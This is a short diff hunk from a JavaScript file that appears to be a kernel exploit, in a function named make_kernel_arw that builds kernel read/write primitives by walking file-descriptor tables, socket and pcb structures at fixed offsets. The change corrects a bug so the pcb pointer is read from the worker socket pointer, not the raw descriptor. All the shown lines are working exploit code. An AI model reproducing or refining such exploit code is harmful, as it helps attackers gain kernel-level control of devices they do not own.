@@ -1114,7 +1114,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
   const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
   log(`worker sock pointer: ${worker_sock}`);
-  const w_pcb = kread64(worker_sd.add(0x18));
+  const w_pcb = kread64(worker_sock.add(0x18));
   log(`worker sock pcb: ${w_pcb}`);
   const w_pktopts = kread64(w_pcb.add(0x118));
   log(`worker pktopts: ${w_pktopts}`);
